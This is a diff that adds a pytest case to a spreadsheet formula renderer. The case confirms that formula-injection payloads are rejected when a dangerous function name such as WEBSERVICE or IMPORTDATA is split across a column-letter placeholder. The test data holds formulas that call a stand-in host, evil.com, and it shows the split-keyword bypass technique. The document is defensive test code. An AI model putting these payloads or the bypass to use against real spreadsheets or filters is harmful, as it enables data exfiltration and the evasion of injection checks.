@@ -220,6 +220,44 @@ class TestRenderFormulaCustomInjection:
         )
         assert result == "=D$10*1.1"
 
+    @pytest.mark.parametrize(
+        "formula,col_letter",
+        [
+            ('=WEB{col_letter}ERVICE("http://evil.com")', "S"),
+            ('=IMPORT{col_letter}ATA("http://evil.com/data.csv")', "D"),
+            ('=HYPER{col_letter}INK("http://evil.com","click")', "L"),
+            ('=IN{col_letter}IRECT("[http://evil.com/x.xlsx]Sheet1!A1")', "D"),
+            ('=ENCODE{col_letter}RL("http://evil.com")', "U"),
+        ],
+        ids=[
+            "WEBSERVICE_split_at_S",
+            "IMPORTDATA_split_at_D",
+            "HYPERLINK_split_at_L",
+            "INDIRECT_split_at_D",
+            "ENCODEURL_split_at_U",
+        ],
+    )
+    def test_render_formula_rejects_post_substitution_bypass(self, formula: str, col_letter: str) -> None:
+        """Column-split bypass: dangerous keyword split across {col_letter} placeholder."""
+        ctx = CellContext(
+            period_index=2,
+            n_history=2,
+            row=10,
+            col=4,
+            col_letter=col_letter,
+            prior_col_letter="C",
+            named_ranges={},
+            row_map={"revenue": 10},
+            inputs_row_map={},
+            scenario_prefix="",
+            first_proj_col_letter="D",
+            last_proj_col_letter="H",
+            entity_col_range="",
+            driver_names=frozenset(),
+        )
+        with pytest.raises(FormulaInjectionError):
+            render_formula("custom", {"formula": formula, "_line_item_key": "x"}, ctx)
+
 
 class TestFormulaInjectionProperty:
     """Property-based tests for formula injection validation."""
